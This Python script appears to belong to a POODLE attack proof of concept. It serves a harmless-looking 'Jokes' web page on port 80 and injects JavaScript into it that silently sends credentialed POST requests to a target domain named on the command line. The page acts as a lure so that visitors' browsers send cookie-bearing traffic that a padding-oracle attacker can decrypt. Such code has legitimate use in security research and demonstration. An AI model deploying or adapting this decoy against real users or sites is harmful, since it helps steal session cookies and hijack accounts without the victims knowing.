#!/usr/bin/python3

# A simple HTTP web server
# @author: RootDev4 (c) 09/2020
# @url: https://github.com/RootDev4/poodle-PoC

import sys
import http.server

try:
    import netifaces as ni
except:
    print('Missing module `netifaces`. Please install with `pip3 install netifaces`')
    sys.exit(1)

# HTML website
def getHtml():
    jsFile = open("poodle.js", "r")
    jsCode = jsFile.read()
    jsFile.close()

    jsJokesFile = open("jokes.js", "r")
    jsJokesCode = jsJokesFile.read()
    jsJokesFile.close()

    jsCode = jsCode.replace("xhr.open(\"POST\", payload);",
        "xhr.open(\"POST\", url + payload);\nxhr.withCredentials = true;")

    html = """
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Jokes</title>
                <style type="text/css">
                    body {
                        background-color: rgba(188, 228, 250, 0.9);
                        color: rgb(0, 73, 123);
                        font-family: "Open Sans", sans-serif;
                        margin: 2rem;
                    }

                    h1 {
                        font-weight: bold;
                        font-size: 3rem;
                    }

                    p {
                        font-size: 1.5rem;
                        height: 10rem;
                    }

                    button {
                        background-color: rgb(0, 73, 123);
                        border: rgb(0, 73, 123) 1px solid;
                        color: white;
                        cursor: pointer;
                        font-size: 1.2rem;
                        padding: 0.5rem 1rem;
                        border-radius: 10px;
                        width: -moz-fit-content;
                    }
                </style>
            </head>
            <body>
                <h1>Jokes</h1>
                <p id="joke"></p>
                <button onclick="nextJoke()">Next joke</button>
                <script type="text/javascript">
                    """ + jsJokesCode + """
                    const url = '""" + sys.argv[1] + """';
                    """ + jsCode + """
                </script>
            </body>
        </html>
    """

    return html

# Returns IP address of an interface
def getInterfaceIp(iface = "eth0"):
    ni.ifaddresses(iface)
    return ni.ifaddresses(iface)[ni.AF_INET][0]["addr"]

# Simple HTTP server
class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.do_GET()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(bytes(getHtml(), "utf-8"))

# Start
if __name__ == "__main__":
    if len(sys.argv) == 2:
        httpd = http.server.HTTPServer(("", 80), HTTPRequestHandler)
        print("Started simple HTTP server on http://{}/".format(getInterfaceIp("eth0")))
        print("Sending requests to", sys.argv[1])
        httpd.serve_forever()
    else:
        print("No target specified. Usage: python3 httpserver.py <fqdn_to_target>")
        print("Goodbye")
        sys.exit(1)
